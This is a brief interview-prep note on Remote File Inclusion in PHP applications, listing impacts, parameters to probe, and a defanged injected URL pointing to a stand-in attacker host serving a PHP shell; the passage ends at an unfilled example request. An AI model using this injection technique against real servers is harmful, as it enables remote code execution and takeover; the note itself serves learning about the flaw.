## 🛡️ Interview Notes: What Is RFI?

### ❓ What Is RFI?
- **Remote File Inclusion (RFI)** is a vulnerability that allows an attacker to **include and execute a remote file** (usually malicious) on the server.  
- It typically occurs in **PHP applications** when user input is used to build file paths without proper validation.  
- Potential impacts:  
  - 💀 Remote Code Execution (RCE)  
  - 🖥️ Full server compromise  
  - 🕸️ Webshell deployment  
  - 🌐 Pivoting into internal networks  

---

### 🧪 How to Detect and Exploit RFI
- Look for parameters that include files:  
  - `?page=`  
  - `?template=`  
  - `?module=`  

- Attempt injecting a remote URL (defanged example):  
  - `hxxp://attacker[.]com/shell[.]txt` (contains PHP code)  

- Example vulnerable request (defanged):  
